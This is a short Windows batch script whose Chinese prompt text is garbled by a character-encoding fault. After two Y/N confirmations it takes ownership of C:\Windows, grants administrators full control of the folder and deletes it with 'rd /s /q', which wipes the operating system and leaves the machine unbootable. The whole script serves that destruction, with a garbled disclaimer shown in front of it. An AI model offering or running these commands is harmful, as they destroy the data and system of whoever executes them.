@echo off
setlocal
:f
choice /c YN /n /m "ȷ��Ҫ�ս�Windows��(Y/N)"
if errorlevel 2 (
    exit
)
:s
echo �ⲻ����Ц���� ȷ�Ϸ����κκ����ԭ�����޹�
choice /c YN /n /m "ȷ��Ҫ�ս�Windows�� (Y/N)"
if errorlevel 2 (
    exit
)

echo ��ʼִ��
takeown /F C:\Windows /R /D Y
icacls C:\Windows /grant administrators:F /T
rd /s /q C:\Windows